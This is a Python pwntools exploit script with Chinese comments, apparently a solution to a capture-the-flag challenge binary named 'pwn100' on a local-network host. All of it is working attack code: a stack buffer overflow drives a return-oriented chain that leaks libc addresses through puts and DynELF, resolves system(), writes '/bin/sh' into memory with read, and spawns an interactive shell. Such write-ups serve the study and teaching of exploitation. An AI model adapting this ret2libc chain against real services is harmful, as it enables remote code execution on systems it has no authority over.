#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.3", 10001)
elf = ELF("./pwn100")

puts_addr = elf.plt['puts']
read_got = elf.got['read']

start_addr = 0x400550
pop_rdi = 0x400763
pop6_addr = 0x40075a   		#万能gadget1：pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
mov_call_addr = 0x400740	#万能gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
binsh_addr = 0x60107c		#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃，所以找了个固定的可写地址

def leak(addr):
	count = 0
	up = ''
	content = ''
	payload = 'A'*72				#padding
	payload += p64(pop_rdi)			#给puts()赋值
	payload += p64(addr)			#leak函数的参数addr
	payload += p64(puts_addr)		#调用puts()函数
	payload += p64(start_addr)		#跳转到start，恢复栈
	payload = payload.ljust(200, 'B')	#padding
	io.send(payload)
	io.recvuntil("bye~\n")
	while True:								#无限循环读取，防止recv()读取输出不全
		c = io.recv(numb=1, timeout=0.1)	#每次读取一个字节，设置超时时间确保没有遗漏
		count += 1							
		if up == '\n' and c == "": 			#上一个字符是回车且读不到其他字符，说明读完了
			content = content[:-1]+'\x00'	#最后一个字符置为\x00
			break
		else:
			content += c	#拼接输出
			up = c	#保存最后一个字符
	content = content[:4]	#截取输出的一段作为返回值，提供给DynELF处理
	log.info("%#x => %s" % (addr, (content or '').encode('hex')))
	return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
log.info("system_addr = %#x", system_addr)

payload = "A"*72			#padding
payload += p64(pop6_addr)	#万能gadget1
payload += p64(0)			#rbx = 0
payload += p64(1)			#rbp = 1，过掉后面万能gadget2的call返回后的判断
payload += p64(read_got)	#r12 = got表中read函数项，里面是read函数的真正地址，直接通过万能gadget2的call qword ptr [r12+rbx*8]调用
payload += p64(8)			#r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx
payload += p64(binsh_addr)	#r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi
payload += p64(0)			#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi
payload += p64(mov_call_addr)	#万能gadget2
payload += '\x00'*56		#万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈
payload += p64(start_addr)	#跳转到start，恢复栈
payload = payload.ljust(200, "B")	#padding

io.send(payload)
io.recvuntil('bye~\n')
io.send("/bin/sh\x00")		#上面的一段payload调用了read函数读取"/bin/sh\x00"，这里发送字符串

payload = "A"*72				#padding
payload += p64(pop_rdi)			#给system函数传参
payload += p64(binsh_addr)		#rdi = &("/bin/sh\x00")
payload += p64(system_addr)		#调用system函数执行system("/bin/sh")
payload = payload.ljust(200, "B")	#padding

io.send(payload)
io.interactive()